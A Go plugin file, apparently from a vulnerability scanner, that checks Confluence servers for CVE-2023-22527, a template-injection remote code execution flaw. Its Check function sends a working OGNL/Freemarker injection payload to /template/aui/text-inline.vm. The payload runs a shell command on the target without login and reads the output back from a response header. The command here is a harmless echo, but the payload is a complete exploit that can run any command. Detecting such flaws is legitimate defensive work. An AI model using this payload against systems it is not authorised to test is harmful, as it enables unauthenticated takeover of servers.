package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("atlassian_confluence_rce", &atlassian_confluence_rce{})
}

type atlassian_confluence_rce struct{}

func (p *atlassian_confluence_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "Atlassian Confluence RCE漏洞",
		VulnInfo: "Atlassian Confluence 是由 Atlassian 开发的企业级协作软件。2024年1月16日，Atlassian 官方披露 CVE-2023-22527 Atlassian Confluence 模板注入代码执行漏洞。攻击者可在无需登录的情况下构造恶意请求导致远程代码执行。",
		VulnID:   "CVE-2023-22527",
		Level:    "10.0 CRITICAL",
		URL:      "",
		Version:  "8.5.0 ≤ version ≤ 8.5.3，8.0.x，8.1.x，8.2.x，8.3.x，8.4.x",
		CWE:      "CWE-1336	Improper Neutralization of Special Elements Used in a Template Engine",
	}
}

func (p *atlassian_confluence_rce) Check(netloc string) bool {
	rand_str := utils.GenRandom(10)
	payload := `label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"`
	payload += "echo " + rand_str
	payload += `"}))`

	req, err := http.NewRequest("POST", netloc+"/template/aui/text-inline.vm", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.Other.Header.Get("X-Cmd-Response"), rand_str) {
		return true
	}
	return false
}
